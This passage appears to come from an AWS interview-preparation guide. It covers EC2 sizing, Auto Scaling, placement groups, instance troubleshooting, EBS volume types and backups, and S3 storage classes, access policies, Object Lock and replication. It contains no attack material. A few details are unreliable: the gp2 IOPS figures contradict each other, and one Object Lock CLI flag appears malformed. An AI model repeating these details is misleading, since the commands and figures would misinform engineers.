- **ABAC (Attribute-Based Access Control):** Access control based on tags rather than explicit resource ARNs. Tag IAM roles and resources; write policies using `aws:PrincipalTag` and `aws:ResourceTag` conditions. Scales better than traditional RBAC when you have many resources.

# 3. EC2 — Compute Deep Dive

---

### Q3.1: You're launching a fleet of EC2 instances for a production web application. Walk through your selection process for instance type, AMI, networking, and IAM configuration.

**Answer:**

**Context:** Launching production EC2 requires deliberate choices across compute, storage, networking, and security dimensions.

**1. Instance Type Selection:**

Think in families:
- **General purpose (M-family):** Balanced CPU/memory. Default choice. M6i/M7i for Intel, M6g/M7g for Graviton (ARM).
- **Compute optimized (C-family):** CPU-bound workloads (video encoding, ML inference, batch processing).
- **Memory optimized (R-family):** In-memory databases, caching, real-time analytics.
- **Storage optimized (I/D-family):** High sequential or random I/O (OLTP databases, data warehousing).

For a typical web app: start with `m6i.large` (2 vCPU, 8 GiB RAM) or `m7g.large` (Graviton — 20% better price/performance for compatible workloads).

**Graviton decision:** If your app is containerized or runs on interpreted languages (Python, Node.js, Java), Graviton is almost always better price/performance. If you depend on x86-specific binaries or need GPU, stick with Intel/AMD.

**2. AMI (Amazon Machine Image):**
- Use Amazon Linux 2023 or Ubuntu 24.04 LTS for general workloads.
- Prefer AWS-maintained AMIs — patched regularly.
- Build custom AMIs with Packer or EC2 Image Builder for pre-configured images (faster boot, consistent environments).
- Golden AMI pattern: bake your app, dependencies, and agents into the AMI. Launch time goes from minutes to seconds.

**3. Networking:**
- Launch in a private subnet (app tier, per Q1.1 architecture).
- Assign appropriate Security Group (per Q1.3).
- Enhanced Networking (ENA): Enabled by default on modern instance types. Provides up to 100 Gbps network bandwidth and lower latency.
- For high-throughput workloads: consider placement groups (Q3.3).

**4. IAM Configuration — Instance Profile:**

EC2 instances get AWS API credentials through an Instance Profile, which is a container for an IAM role.

```
EC2 Instance → Instance Profile → IAM Role → Policies
```

- Never store access keys on EC2. Always use instance profiles.
- The role's policies define what the EC2 can do (e.g., read from S3, write to DynamoDB).
- The EC2 Instance Metadata Service (IMDS) provides the temporary credentials at `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`.
- **Use IMDSv2** (token-required) to mitigate SSRF attacks. IMDSv1 (no token, simple GET) is vulnerable to SSRF — an attacker could make the instance's web server proxy a request to the metadata endpoint.

**IMDSv2 enforcement:**
```bash
aws ec2 modify-instance-metadata-options \
  --instance-id i-abc123 \
  --http-tokens required \
  --http-put-response-hop-limit 1
```

**Architecture:**

```
User → ALB → EC2 (Private Subnet)
                │
                ├── Instance Profile → IAM Role → S3, DynamoDB
                ├── Security Group: Allow 8080 from SG-ALB
                ├── EBS gp3 root volume
                └── IMDSv2 enforced
```

**Multi-account:** AMIs can be shared across accounts (private sharing or via AWS Organizations). Instance profiles/roles are per-account — each account has its own IAM roles.

**Multi-region:** AMIs are region-specific. To launch in another region, copy the AMI (`ec2:CopyImage`). Use EC2 Image Builder with multi-region distribution for automated AMI replication.

**Concepts introduced:**
- **Instance Profile:** An IAM construct that wraps a role and allows EC2 instances to assume that role. When you "assign a role to an EC2 instance," you're actually attaching an instance profile.
- **IMDS (Instance Metadata Service):** An HTTP endpoint (169.254.169.254) available only from within the instance. Provides instance metadata, user data, and IAM credentials. IMDSv2 requires a session token (PUT then GET), mitigating SSRF attacks.
- **Golden AMI:** A pre-configured AMI with OS, security patches, agents, and often application code baked in. Enables fast, consistent launches.

---

### Q3.2: Your Auto Scaling Group is not scaling fast enough during traffic spikes, and instances take 5 minutes to become healthy. How do you troubleshoot and optimize?

**Answer:**

**Context:** Auto Scaling responsiveness depends on: detection speed, instance launch speed, and health check timing.

**Root cause analysis:**

1. **Detection delay — CloudWatch metric lag:**
   - Default CloudWatch metrics (CPUUtilization) have 5-minute periods (basic monitoring).
   - Enable **Detailed Monitoring** (1-minute periods, $2.10/instance/month) for faster detection.
   - Scaling policy evaluates after the alarm triggers. A policy with "3 consecutive datapoints of 1 minute each" means at least 3 minutes before action.

   Fix: Reduce evaluation periods. Use target tracking policies which auto-adjust.

2. **Launch speed — instance bootstrap time:**
   - Cold boot: launch instance → install packages → configure app → start service = 3–5 minutes.
   - Fix with Golden AMI (explained in Q3.1): bake everything in. Boot time drops to 30–60 seconds.
   - Even better: Use **Warm Pools** — pre-initialized instances in a stopped or running state, ready to join the ASG immediately.

3. **Health check grace period:**
   - The ASG waits this duration after launch before checking health. If too long, the ASG thinks the instance is still initializing and won't replace it or add more.
   - If too short, the ASG may terminate instances that haven't finished booting, causing a replacement loop.
   - Set it to just slightly longer than your actual startup time.

4. **Scaling policy type matters:**
   - **Target Tracking:** "Keep average CPU at 50%." AWS manages when to scale up/down. Simplest, most reactive.
   - **Step Scaling:** "If CPU > 70%, add 2. If CPU > 90%, add 5." More control but requires tuning.
   - **Predictive Scaling:** Uses ML to forecast traffic patterns and pre-provisions capacity before the spike. Best for predictable cyclical patterns (9am Monday spikes, etc.).

**Optimized ASG configuration:**

```
ASG Configuration:
  Min: 2, Max: 20, Desired: 4
  Launch Template: Golden AMI, m6i.large, gp3 EBS
  Health Check: ELB type (not EC2) — uses ALB target group health
  Health Check Grace Period: 90 seconds
  Warm Pool: 2 pre-initialized stopped instances
  Scaling Policy: Target Tracking — CPU 50%
  Cooldown: 60 seconds (time between scaling activities)
  Instance Refresh: Rolling updates with 10% max unhealthy
```

**Architecture:**

```
CloudWatch Alarm (CPU > threshold)
       │
       ▼
ASG Scaling Policy ──► Launch from Warm Pool (or new instance)
       │
       ▼
Instance joins ALB Target Group
       │
       ▼
ALB Health Check passes → Traffic routed
```

**Lifecycle Hooks:** For custom initialization, use lifecycle hooks. The instance enters `Pending:Wait` state where you can run scripts (pull configs, register with service mesh) before signaling `CONTINUE`. The ASG won't consider the instance healthy until the hook completes.

**Trade-offs:**
- Warm Pools reduce scaling latency to seconds but cost money (stopped instances keep EBS volumes; running warm pool instances cost full EC2).
- Predictive Scaling needs 14 days of historical data. Best combined with target tracking.
- Over-aggressive scaling leads to thrashing (scale up → scale down → scale up). Cooldown periods prevent this.

**Multi-account:** Each account manages its own ASGs. In a central deployment model (e.g., from a CI/CD account), the CI/CD pipeline updates launch templates across accounts using cross-account roles (Q2.2).

**Multi-region:** ASGs are regional. For multi-region deployments, maintain separate ASGs in each region. Use Route 53 (Q9.1) or Global Accelerator (Q26.1) to distribute traffic across regions.

**Concepts introduced:**
- **Auto Scaling Group (ASG):** Manages a fleet of EC2 instances, automatically adjusting the number based on demand, health checks, and scaling policies.
- **Launch Template:** Defines instance configuration (AMI, instance type, SG, IAM role, user data). Versioned — ASGs reference a specific version.
- **Warm Pool:** Pre-provisioned instances in stopped or running state that can be added to the ASG much faster than launching from scratch.
- **Lifecycle Hooks:** Allow custom actions during ASG instance launch or termination. Instance pauses in a wait state until the hook completes or times out.
- **Target Tracking Scaling Policy:** Automatically adjusts capacity to keep a specified metric at a target value.
- **Cooldown Period:** Time after a scaling activity during which the ASG won't initiate another. Prevents thrashing.

### Q3.3: Your application involves inter-node communication with very low latency requirements (e.g., HPC, distributed database). How do you optimize EC2 networking?

**Answer:**

**Context:** Network-sensitive workloads (HPC simulations, distributed OLTP databases like CockroachDB/TiDB, ML training clusters) need minimal latency between nodes.

**Solution: Placement Groups**

1. **Cluster Placement Group:**
   - All instances in the same AZ, physically close — same rack or adjacent racks.
   - Lowest latency, highest throughput (up to 100 Gbps with ENA).
   - Risk: single-rack failure affects all instances.
   - Use for: HPC, tightly-coupled distributed systems, short-lived batch jobs.

2. **Spread Placement Group:**
   - Each instance on distinct hardware (different racks).
   - Max 7 instances per AZ per group.
   - Use for: Small critical clusters where you want maximum fault isolation (e.g., ZooKeeper quorum, etcd cluster).

3. **Partition Placement Group:**
   - Instances divided into partitions, each on different racks.
   - Up to 7 partitions per AZ.
   - Use for: Large distributed systems (Hadoop, Cassandra, Kafka) where you want rack-awareness without limiting to 7 instances.

**Additional optimization: Elastic Fabric Adapter (EFA):**
- Network interface that provides HPC-grade inter-node communication.
- Supports OS-bypass (applications talk directly to the network adapter, skipping the kernel stack).
- Only works with Cluster Placement Groups.
- Used for MPI (Message Passing Interface) workloads, ML training.

**Architecture (HPC cluster):**

```
Cluster Placement Group (single AZ)
┌────────────────────────────────────────┐
│  Node-1 ←──EFA──► Node-2              │
│    ↕                 ↕                 │
│  Node-3 ←──EFA──► Node-4              │
│                                        │
│  Shared: FSx for Lustre (parallel FS)  │
└────────────────────────────────────────┘
```

**Trade-offs:**
- Cluster: Best performance, worst fault tolerance.
- Spread: Best fault tolerance, limited to 7 per AZ.
- Partition: Balance of both, good for large distributed data systems.

**Multi-account/Multi-region:** Placement groups are per-account, per-AZ. They don't span accounts or regions. HPC workloads are typically single-AZ, single-account.

**Concepts introduced:**
- **Placement Groups:** Influence how instances are physically placed in AWS data centers. Three strategies: cluster (low latency), spread (fault isolation), partition (rack-aware distribution).
- **EFA (Elastic Fabric Adapter):** An EC2 network interface enabling HPC-grade communication with OS-bypass capability. Latency comparable to on-prem InfiniBand.

### Q3.4: You have a production EC2 instance that's become unresponsive. SSH doesn't work. The application is down. How do you troubleshoot?

**Answer:**

**Context:** A "dead" instance with no SSH access requires systematic investigation using AWS-native tools.

**Step-by-step troubleshooting:**

1. **Check Instance Status Checks (CloudWatch/Console):**
   - **System Status Check:** Tests the underlying AWS hardware/infrastructure. If failed, the host is degraded. Fix: stop and start the instance (migrates to new host). DO NOT just reboot — reboot keeps the same host.
   - **Instance Status Check:** Tests the instance's OS. If failed, it's a guest OS issue (kernel panic, disk full, network misconfigured).

2. **Get System Console Output:**
   ```bash
   aws ec2 get-console-output --instance-id i-abc123
   ```
   Shows the serial console output (boot messages, kernel panics, filesystem errors). This works even without SSH.

3. **EC2 Serial Console:**
   - Interactive serial console access — like plugging a monitor into the server.
   - Must be enabled at the account level first.
   - Requires an OS-level password (not SSH key).
   - Useful for fixing network misconfigurations, iptables rules that locked you out, etc.

4. **SSM Session Manager (if SSM agent was running pre-failure):**
   - Systems Manager Session Manager doesn't use SSH — it uses the SSM agent + IAM.
   - Works even if SG doesn't allow port 22.
   - Requires the instance to have the SSM agent running AND an IAM role with `AmazonSSMManagedInstanceCore`.

5. **If all else fails — detach and mount EBS volume:**
   - Stop the failed instance.
   - Detach its root EBS volume.
   - Attach it to a healthy "rescue" instance as a secondary volume.
   - Mount the filesystem, inspect logs (`/var/log/syslog`, `/var/log/cloud-init.log`), fix configs.
   - Detach, reattach to original instance, start.

**Decision tree:**

```
Instance unresponsive
       │
       ├── System Status Check failed → Stop & Start (new host)
       │
       ├── Instance Status Check failed → Get console output
       │       │
       │       ├── Kernel panic → Fix via EBS detach/reattach
       │       ├── Disk full → Fix via EBS detach/reattach
       │       └── Network misconfigured → EC2 Serial Console
       │
       └── Both checks pass but app down → Application-level issue
               │
               ├── SSM Session Manager → Check app logs
               ├── CloudWatch Agent logs → Application crashes
               └── ALB health check logs → 5xx errors
```

**Multi-account:** SSM Session Manager can be used cross-account if the target instance's role trusts a role from the admin account. Centralize SSM access in a "tools" account.

**Multi-region:** Troubleshooting is region-specific. Console output, serial console, and SSM are all regional services.

---

### Q3.5: How does EC2 Hibernation work and when would you use it vs Stop/Start?

**Answer:**

**Context:** Stop/Start loses in-memory state (RAM). For applications with long initialization sequences that load large datasets into memory (in-memory caches, pre-computed indices), restarting is expensive.

**Hibernation:** Saves the instance's RAM contents to the root EBS volume, then stops the instance. On resume, RAM is restored and processes continue from where they left off — like closing and reopening a laptop.

**Requirements:**
- Must be enabled at launch (can't enable later).
- Root volume must be EBS (not instance store), encrypted, and large enough to hold the RAM.
- Supported on select instance families (M, C, R families, up to 150 GiB RAM).
- Not supported with Spot Instances.
- Max hibernation duration: 60 days.

**Use cases:**
- Dev/test environments with long startup — hibernate at EOD, resume in the morning.
- Pre-warmed caches that take 30+ minutes to build.
- Long-running batch jobs you want to pause and resume.

**Not for production HA** — use ASGs and proper state management instead.

**Concepts introduced:**
- **EC2 Hibernation:** Saves RAM to the encrypted root EBS volume on stop, restores on start. Processes resume from exactly where they were. Limited to specific instance types and root volume constraints.

# 4. EBS — Block Storage

---

### Q4.1: You need to choose EBS volume types for three workloads: a web app, a relational database, and a data warehouse. How do you decide?

**Answer:**

**Context:** EBS volume types differ in performance characteristics and cost. Choosing wrong leads to either overspending or performance bottlenecks.

**EBS Volume Types:**

```
| Volume Type | Use Case              | Max IOPS    | Max Throughput | Cost Model       |
|-------------|----------------------|-------------|----------------|------------------|
| gp3         | General purpose       | 16,000      | 1,000 MiB/s    | $/GB + $/IOPS    |
| gp2         | General (legacy)      | 16,000      | 250 MiB/s      | $/GB (burst)     |
| io2 BE      | Critical databases    | 256,000     | 4,000 MiB/s    | $/GB + $/IOPS    |
| st1          | Sequential (DW, logs) | 500         | 500 MiB/s      | $/GB (cheap)     |
| sc1          | Cold/archival         | 250         | 250 MiB/s      | $/GB (cheapest)  |
```

**For each workload:**

1. **Web app (moderate IOPS, mixed I/O):** `gp3` — baseline 3,000 IOPS and 125 MiB/s included. Scale IOPS and throughput independently. Cheaper than gp2 for most workloads because gp2 ties IOPS to volume size (3 IOPS per GiB). With gp3, you can have a small 50 GiB volume with 10,000 IOPS.

2. **Relational database (high IOPS, consistent latency):** `io2 Block Express` for mission-critical. Sub-millisecond latency, up to 256,000 IOPS. For non-critical databases, `gp3` at 16,000 IOPS is often sufficient. The cost difference is significant — io2 charges per provisioned IOPS ($0.065/IOPS/month).

3. **Data warehouse (sequential reads, high throughput):** `st1` — optimized for sequential, throughput-heavy workloads. Cannot be a boot volume. At $0.045/GiB/month, much cheaper than gp3 ($0.08/GiB/month).

**gp2 vs gp3 decision:**
- gp2 uses a burst credit model: 100 IOPS baseline per GiB, bursts to 3,000 IOPS. Volumes < 1 TiB get burst. Volumes ≥ 1 TiB have sustained 3,000+ IOPS.
- gp3 gives you 3,000 IOPS baseline regardless of size. For volumes under ~170 GiB, gp3 is strictly better.
- Migrate legacy gp2 to gp3 by modifying the volume (online, no downtime).

**Multi-AZ consideration:** EBS volumes exist in a single AZ. If the AZ goes down, the volume is unavailable. Use EBS Snapshots (Q4.2) for backup and cross-AZ recovery.

**Multi-account:** EBS volumes can't be shared across accounts. Share via snapshots (snapshot → share to account → create volume from snapshot).

**Multi-region:** EBS is AZ-scoped. Cross-region: copy snapshots to another region (`ec2:CopySnapshot`).

**Concepts introduced:**
- **EBS (Elastic Block Store):** Persistent block storage for EC2. Exists in a single AZ. Multiple volume types optimized for different I/O patterns.
- **IOPS (Input/Output Operations Per Second):** Measure of random I/O performance. Critical for databases.
- **Throughput (MiB/s):** Measure of sequential I/O performance. Critical for data warehousing, log processing.
- **gp3:** Current-generation general purpose SSD. Decouples IOPS and throughput from volume size.
- **io2 Block Express:** Highest-performance EBS, designed for sub-millisecond latency critical databases.

---

### Q4.2: Your team doesn't have a proper EBS backup strategy, and you recently lost data when someone terminated an instance. Design a backup strategy.

**Answer:**

**Context:** EBS data loss can occur from accidental termination, corruption, or AZ failures. A proper backup strategy is non-negotiable for production.

**EBS Snapshots:**
- Point-in-time backups stored in S3 (managed by AWS — you don't see the S3 bucket).
- Incremental: only blocks changed since the last snapshot are saved. But each snapshot is independently restorable (AWS manages the chain).
- Snapshots are region-scoped but can be copied cross-region.
- Creating a snapshot from a running instance is safe but may not include data in OS write caches. For databases, consider flushing/freezing writes or using application-consistent snapshots.

**Backup strategy using Amazon Data Lifecycle Manager (DLM):**

```json
DLM Policy:
  Target: Tag: "Backup=true"
  Schedule:
    - Every 6 hours, retain 4 snapshots (24hr coverage)
    - Daily at 2 AM, retain 30 snapshots (30-day coverage)
    - Weekly (Sunday 3 AM), retain 12 snapshots (3-month coverage)
  Cross-region copy: Enabled → us-west-2 (DR)
  Fast Snapshot Restore: Enabled in primary AZ (for fast recovery)
```

**Fast Snapshot Restore (FSR):**
- Without FSR, volumes created from snapshots have "lazy loading" — data blocks are pulled from S3 on first access, causing performance degradation.
- FSR pre-warms the snapshot so volumes created from it have full performance immediately.
- Costs: $0.75/hour per snapshot per AZ. Only enable for snapshots you'll restore from in production.

**Protection against accidental termination:**
1. **EC2 Termination Protection:** Prevents `TerminateInstances` API calls (accidental `terraform destroy`, console mistakes).
2. **EBS DeleteOnTermination=false:** Keep the root volume even if the instance is terminated.
3. **S3 Object Lock on snapshot exports** (for compliance — explained in Q5.3).

**Architecture:**

```
EC2 (Production)
  │
  └── EBS Volume
        │
        ├── DLM: Automated snapshots every 6hrs
        │     └── Retained: 4 snapshots
        │
        ├── DLM: Daily snapshots
        │     └── Retained: 30 days
        │     └── Cross-region copy → us-west-2
        │
        └── Manual: Pre-maintenance snapshots
              └── Tag: "manual-pre-upgrade-v2.1"
```

**Recovery process:**
1. Create new EBS volume from snapshot.
2. Attach to new or existing EC2 instance.
3. Mount filesystem.
4. If FSR is enabled: immediate full performance.
5. If FSR is not enabled: first reads may be slow (data loading from S3).

**Multi-account:** Share snapshots with other accounts via `ModifySnapshotAttribute`. For organizational DR, the backup account receives snapshot copies from all production accounts.

**Multi-region:** Copy snapshots cross-region for DR. DLM supports automated cross-region copy as part of the policy. Cross-region copy incurs data transfer charges.

**Concepts introduced:**
- **EBS Snapshots:** Incremental, point-in-time backups of EBS volumes stored in S3. Each snapshot is independently restorable. Region-scoped but copyable cross-region.
- **DLM (Data Lifecycle Manager):** Automates EBS snapshot creation, retention, and cross-region copy based on tag-based policies.
- **Fast Snapshot Restore (FSR):** Pre-warms snapshots to eliminate first-read latency when creating volumes from them. Costs per snapshot per AZ per hour.

---

### Q4.3: You need to encrypt all existing unencrypted EBS volumes in your account to meet compliance. How?

**Answer:**

**Context:** EBS encryption is at-rest encryption using AWS KMS (explained in Q13.1). You can't encrypt an existing unencrypted volume in-place.

**Process:**

```
Unencrypted Volume → Snapshot → Copy Snapshot (with encryption) → Create Volume from encrypted snapshot
```

Step-by-step:
1. Create a snapshot of the unencrypted volume.
2. Copy the snapshot, specifying encryption = true and a KMS key.
3. Create a new volume from the encrypted snapshot (in the desired AZ).
4. Stop the instance, detach the old volume, attach the new encrypted volume at the same device path.
5. Start the instance.

**Automation:** For fleet-wide encryption, script this process or use AWS Config with a remediation action.

**Default Encryption:** Enable account-level default EBS encryption:
```bash
aws ec2 enable-ebs-encryption-by-default --region us-east-1
```
All new volumes will be encrypted automatically with the default KMS key (or a specified CMK). Existing volumes are NOT retroactively encrypted.

**Performance impact:** EBS encryption has negligible performance impact (< 1% in most benchmarks). It uses AES-256 and is hardware-accelerated on modern instance types.

**Multi-account:** Enable default encryption in each account via SCP enforcement or AWS Config organizational rules.

**Multi-region:** Default encryption is per-region. Enable in each region. Use an SCP to deny `ec2:CreateVolume` when encryption is not specified (belt-and-suspenders approach).

# 5. S3 — Object Storage

---

### Q5.1: Your company has 50 TB of data with varying access patterns: some accessed daily, some monthly, some almost never. How do you optimize S3 storage costs?

**Answer:**

**Context:** S3 offers multiple storage classes with different cost profiles. Choosing wrong can mean 10x cost differences.

**S3 Storage Classes:**

```
| Storage Class            | Access Pattern       | Cost/GB/mo    | Retrieval Cost  | Min Duration |
|--------------------------|---------------------|---------------|-----------------|--------------|
| S3 Standard              | Frequent            | $0.023        | None            | None         |
| S3 Intelligent-Tiering   | Unknown/changing    | $0.023 + mgmt | None            | None         |
| S3 Standard-IA           | Infrequent (~1/mo)  | $0.0125       | Per-GB retrieval| 30 days      |
| S3 One Zone-IA           | Infrequent, recreatable | $0.01     | Per-GB retrieval| 30 days      |
| S3 Glacier Instant       | Quarterly access    | $0.004        | Per-GB retrieval| 90 days      |
| S3 Glacier Flexible      | 1-2x/year, minutes  | $0.0036       | Per-request+GB  | 90 days      |
| S3 Glacier Deep Archive  | Regulatory/archive  | $0.00099      | Hours retrieval | 180 days     |
```

**Design for 50 TB:**

1. **Hot data (daily access, ~5 TB):** S3 Standard or Intelligent-Tiering.
2. **Warm data (monthly access, ~15 TB):** S3 Standard-IA. Save ~45% vs Standard. But pay $0.01/GB on retrieval, and objects have a 30-day minimum storage charge.
3. **Cold data (yearly/compliance, ~30 TB):** S3 Glacier Flexible or Deep Archive. Save 85–95%.

**S3 Lifecycle Policies** automate transitions:

```json
{
  "Rules": [
    {
      "ID": "ArchiveOldData",
      "Filter": {"Prefix": "logs/"},
      "Status": "Enabled",
      "Transitions": [
        {"Days": 30, "StorageClass": "STANDARD_IA"},
        {"Days": 90, "StorageClass": "GLACIER"},
        {"Days": 365, "StorageClass": "DEEP_ARCHIVE"}
      ],
      "Expiration": {"Days": 2555}
    }
  ]
}
```

**S3 Intelligent-Tiering:** Automatically moves objects between access tiers based on usage patterns. No retrieval fees. Small monitoring fee ($0.0025 per 1,000 objects/month). Best when access patterns are unpredictable.

**Trade-offs:**
- IA classes have per-GB retrieval fees. If an "infrequent" object is actually accessed often, IA costs MORE than Standard.
- Glacier has retrieval time (Expedited: 1–5 min, Standard: 3–5 hr, Bulk: 5–12 hr for Flexible). Deep Archive: 12–48 hr.
- Minimum storage durations mean early deletion still incurs the full duration's cost.
- Object size matters: objects < 128 KB in IA classes are charged as 128 KB.

**Multi-account:** Use S3 bucket policies with `aws:PrincipalOrgID` condition (Q2.4) to allow cross-account access. A central data lake account can aggregate data from multiple accounts.

**Multi-region:** S3 buckets are regional. Use S3 Cross-Region Replication (Q5.4) to maintain copies in other regions for DR or latency optimization.

**Concepts introduced:**
- **S3 Storage Classes:** Different tiers optimized for access frequency and cost. Range from Standard (hot) to Deep Archive (cold archival).
- **S3 Lifecycle Policies:** Rules that automatically transition objects between storage classes or expire them based on age.
- **S3 Intelligent-Tiering:** Automatic tier management based on access patterns. No retrieval fees. Best for unpredictable access.

---

### Q5.2: You need to make an S3 bucket accessible to a specific IAM role in another account, while ensuring no public access is possible. What's your approach?

**Answer:**

**Context:** S3 is a common attack vector because of misconfigured bucket policies. Cross-account access must be precise.

**Layer 1: S3 Block Public Access (account and bucket level)**

Enable all four settings:
- Block public ACLs
- Ignore public ACLs
- Block public bucket policies
- Restrict public bucket policies

This is the nuclear option — even if someone accidentally adds a `"Principal": "*"` policy, Block Public Access prevents it from taking effect.

```bash
aws s3api put-public-access-block --bucket my-bucket \
  --public-access-block-configuration \
  BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
```

Also enable at the **account level** for defense-in-depth.

**Layer 2: Bucket Policy for cross-account access**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowCrossAccountRole",
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::222222222222:role/DataReader"
      },
      "Action": ["s3:GetObject", "s3:ListBucket"],
      "Resource": [
        "arn:aws:s3:::my-bucket",
        "arn:aws:s3:::my-bucket/*"
      ]
    },
    {
      "Sid": "DenyUnencryptedTransport",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": "arn:aws:s3:::my-bucket/*",
      "Condition": {
        "Bool": {"aws:SecureTransport": "false"}
      }
    }
  ]
}
```

Note the two resources: `arn:aws:s3:::my-bucket` (for `ListBucket`) and `arn:aws:s3:::my-bucket/*` (for `GetObject`). This is a common gotcha — `ListBucket` is a bucket-level action, `GetObject` is an object-level action.

**Layer 3: Identity policy in Account B**

The role `DataReader` in Account B also needs an identity policy allowing `s3:GetObject` on this bucket. Remember: cross-account access requires BOTH sides to allow (Q2.1).

**Using `aws:PrincipalOrgID` for organizational access:**

```json
"Condition": {
  "StringEquals": {
    "aws:PrincipalOrgID": "o-abc123def4"
  }
}
```

This allows any principal in your Organization to access the bucket without listing individual account IDs. Scales automatically as new accounts join.

**Multi-account:** The pattern above IS the cross-account pattern. Prefer `aws:PrincipalOrgID` over listing account IDs for organizational buckets.

**Multi-region:** S3 buckets are regional. Access works from any region, but data transfer costs apply for cross-region access. For latency-sensitive access from another region, use S3 Replication.

**Concepts introduced:**
- **S3 Block Public Access:** Account and bucket-level settings that override public ACLs and policies. Four independent settings that should all be enabled for non-public buckets.
- **S3 Bucket Policy:** A resource-based policy on the S3 bucket. Combined with IAM identity policies to determine access.
- **aws:SecureTransport:** Condition key that is true when the request was made over HTTPS. Use in a Deny statement to enforce TLS.

---

### Q5.3: Your compliance team requires that audit logs stored in S3 be immutable — once written, they cannot be modified or deleted for 7 years. How?

**Answer:**

**Context:** Regulatory frameworks (SEC Rule 17a-4, HIPAA, SOX) require write-once-read-many (WORM) storage.

**Solution: S3 Object Lock**

S3 Object Lock prevents object deletion or modification for a specified duration.

**Two modes:**

1. **Governance Mode:** Most users can't delete/overwrite. Users with `s3:BypassGovernanceRetention` permission CAN override. Useful for soft compliance — protects against accidental deletion but allows authorized exceptions.

2. **Compliance Mode:** NO ONE can delete or overwrite, including the root user. The retention period cannot be shortened. Used for regulatory requirements.

**Configuration:**

```bash
# Enable on bucket creation (must have versioning)
aws s3api create-bucket --bucket audit-logs --object-lock-enabled-for-object-lock

# Set default retention
aws s3api put-object-lock-configuration --bucket audit-logs \
  --object-lock-configuration '{
    "ObjectLockEnabled": "Enabled",
    "Rule": {
      "DefaultRetention": {
        "Mode": "COMPLIANCE",
        "Years": 7
      }
    }
  }'
```

**Legal Hold:** Separate from retention. A legal hold prevents deletion indefinitely until explicitly removed. Used during litigation.

**Key points:**
- Requires S3 Versioning enabled.
- Object Lock is set per-object (or via bucket default).
- In Compliance mode, even AWS Support cannot remove the lock.
- Can be used with any storage class (lifecycle can transition locked objects to Glacier).

**Architecture for audit logging:**

```
Application Accounts ──► CloudTrail ──► S3 Audit Bucket (Logging Account)
                                              │
                                              ├── Object Lock: COMPLIANCE, 7 years
                                              ├── Block Public Access: ALL enabled
                                              ├── Bucket Policy: Deny s3:DeleteObject
                                              ├── Lifecycle: → Glacier after 90 days
                                              └── Cross-Region Replication → DR region
```

**Multi-account:** The audit bucket is in a dedicated Logging account. SCPs (Q2.3) prevent member accounts from modifying CloudTrail or the logging bucket. The logging account is locked down — only authorized security personnel have access.

**Multi-region:** Replicate the audit bucket to another region using CRR (Q5.4). Object Lock settings can replicate with the objects using S3 Replication with Object Lock.

**Concepts introduced:**
- **S3 Object Lock:** WORM storage. Governance mode (soft lock, override with permission) and Compliance mode (hard lock, no one can delete).
- **Legal Hold:** An indefinite hold on an object version that prevents deletion until explicitly removed. Independent of retention periods.
- **S3 Versioning:** Keeps multiple versions of an object. Required for Object Lock. When you "delete" a versioned object, S3 inserts a delete marker; the previous versions remain.

---

### Q5.4: You need S3 data to be available in two regions for disaster recovery and to serve users with lower latency. What are your options?

**Answer:**

**Context:** S3 is regional. For multi-region availability, you need replication.

**S3 Cross-Region Replication (CRR):**

- Asynchronous replication of objects from a source bucket to a destination bucket in a different region.
- Requires versioning on both buckets.
- Replication rules support: prefix/tag filters, storage class override (e.g., Standard → S3-IA in destination), and encryption.
- Does NOT replicate existing objects (unless you run S3 Batch Replication). Only new objects after enabling.
- Does NOT replicate delete markers by default (configurable).

**Same-Region Replication (SRR):**
- Same as CRR but within the same region (different account or same account/different bucket).
- Use case: aggregate logs from multiple accounts into a central bucket, or maintain a real-time copy for compliance.

**Replication Time Control (RTC):**
- SLA: 99.99% of objects replicated within 15 minutes.
- Additional cost. Use for compliance scenarios requiring predictable replication times.

**Architecture:**

```
Region: us-east-1                          Region: eu-west-1
┌──────────────────┐   CRR (async)    ┌──────────────────┐
│ Source Bucket     │ ──────────────►  │ Destination       │
│ (Versioned)       │                  │ Bucket (Versioned)│
│ Storage: Standard │                  │ Storage: S3-IA    │
└──────────────────┘                  └──────────────────┘
       ▲                                      ▲
       │                                      │
  App (us-east-1)                       App (eu-west-1)
  via Route 53 latency-based routing
```

**Cross-account CRR:**
- Source bucket replication config specifies the destination bucket ARN and an IAM role.
- The IAM role needs `s3:ReplicateObject` on the destination bucket.
- Destination bucket policy must allow the source role to write replicas.

**Trade-offs:**
- CRR is asynchronous — there's a lag (usually seconds, but can be longer for large objects).
- RTC adds cost but guarantees 15-minute SLA.
- Delete markers not replicating by default is intentional — prevents accidental deletes from propagating.
- Data transfer costs apply (inter-region transfer rates).

**Alternative: S3 Multi-Region Access Points:**
- A single endpoint that automatically routes requests to the closest bucket.
- Supports active-active read AND write across regions.
- Uses S3 Replication under the hood.
- Adds per-request and data routing costs.

**Multi-account:** CRR works across accounts. The replication role in the source account must be trusted by the destination bucket's policy.

**Multi-region:** CRR IS the multi-region S3 strategy. Pair with Route 53 (Q9.1) for automatic DNS routing to the closest region.

**Concepts introduced:**
- **S3 Cross-Region Replication (CRR):** Asynchronous replication of S3 objects to a bucket in a different region. Requires versioning. Configurable filters, storage class overrides, and encryption.
- **S3 Replication Time Control (RTC):** SLA for 99.99% of objects replicated within 15 minutes. Additional cost.
- **S3 Multi-Region Access Points:** A global endpoint that routes requests to the closest bucket across regions. Supports active-active replication.

---

### Q5.5: How do you optimize S3 performance for a workload doing thousands of PUT/GET operations per second?

**Answer:**

**Context:** S3 can handle 5,500 GETs and 3,500 PUTs per second per prefix. For high-throughput workloads, understand how S3 partitioning works.

**S3 request rate:**
- 3,500 PUT/COPY/POST/DELETE per second per prefix.
- 5,500 GET/HEAD per second per prefix.
- A "prefix" is the key path up to the object name. `logs/2025/01/file.csv` → prefix is `logs/2025/01/`.

**If you need higher throughput:**

1. **Distribute across prefixes:** Use random or hash-based prefixes to spread load across S3 partitions.

   Instead of: `logs/2025-01-15/event-001.json`
   Use: `a1b2/logs/2025-01-15/event-001.json`

   Adding a hash prefix distributes objects across different S3 internal partitions.

2. **S3 Transfer Acceleration:** Uses CloudFront edge locations to accelerate uploads over long distances. Client uploads to the nearest edge, then AWS backbone transfers to the bucket's region. Enable per-bucket. Additional per-GB cost.

